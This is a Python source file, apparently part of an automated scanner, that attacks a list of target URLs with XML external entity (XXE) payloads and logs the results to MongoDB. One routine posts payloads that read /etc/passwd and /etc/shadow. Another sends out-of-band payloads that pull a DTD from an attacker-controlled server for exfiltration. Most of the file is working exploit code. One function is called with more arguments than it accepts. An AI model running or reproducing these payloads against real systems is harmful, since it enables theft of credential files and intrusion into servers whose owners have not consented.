from os import name
import requests, copy, sys, re, socket, time
from pymongo import MongoClient
from pymongo.cursor import CursorType
import requests
from bs4 import BeautifulSoup

client_socket = ""
session = requests.Session()

class schema :
    def __init__(self, detail_type : str) :
        self.type = "xxe"
        self.detail_type = detail_type
        self.url = ''
        self.isHack = False
        self.totUse = 0
        self.content = str()

    def setUrl(self, url : str) :
        self.url = url

    def setisHackOob(self,cnt) :
        self.totUse = cnt
        if self.totUse > 0 : self.isHack = True

    def setisHack(self):
        self.isHack = True

    def settotUse(self, totUse : int) :
        self.totUse = totUse

    def setContent(self, content : str) :
        self.content += content
        self.content += "\n"


def sendMsg(client_socket, msg) :
    client_socket.sendall(msg)

def getMsg(client_socket) :
    data = client_socket.recv(1024)
    return data

def insertItem(item : schema , mongo):
    data = {
        "type" : item.type ,
        "detail_type" : item.detail_type,
        "url" : item.url ,
        "isHack":item.isHack,
        "totUse" : item.totUse,
        "content" : item.content
        }

    mongo.insert_one(data)





# routine : 메인 호출 부분
# argument : None
# return value : None

# XXE Point
def xxe(target_urls : list , mongo , attacker_server):
    genXxeAttack(target_urls , mongo)

    sendMsg(client_socket, "reset".encode())

    oobXxeAttack(target_urls, mongo , attacker_server)





# routine : 일반적인 xxe exploit을 보낸 후 디비에 전송함
# argument : None
# return value : None

def genXxeAttack(target_urls : list , mongo):
    target_files = {
    "root:x:"  : "file:///etc/passwd",
    "root:$" : "file:///etc/shadow" 
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/xml' }

    for target_url in target_urls:
        for xxe_keyword, target_file in target_files.items():

            new_schema = schema("LFI")
            new_schema.setUrl(target_url)
            payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}"> ]><foo>&xxe;</foo>'''.format(target_file)
        
            response = session.post(target_url, data = payload , headers = headers)
            response_data = response.text
            if response_data.find(xxe_keyword) != -1:
                new_schema.setisHack()
                new_schema.setContent(response_data)
            
            insertItem(new_schema, mongo)



# routine : oob xxe exploit을 보냄
# return value : None
def oobXxeAttack(target_urls : list , attacker_server : str):
    global session
    headers = {'Content-Type': 'application/xml;charset=UTF-8',
                'Accept': 'application/xml' }

    for target_url in target_urls:
        url = '{}url/{}'.format(attacker_server,target_url)
        requests.get(url)  
        # Crafting XXE Payload
        payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(attacker_server)
        response = session.post(target_url, data = payload, headers = headers)
            
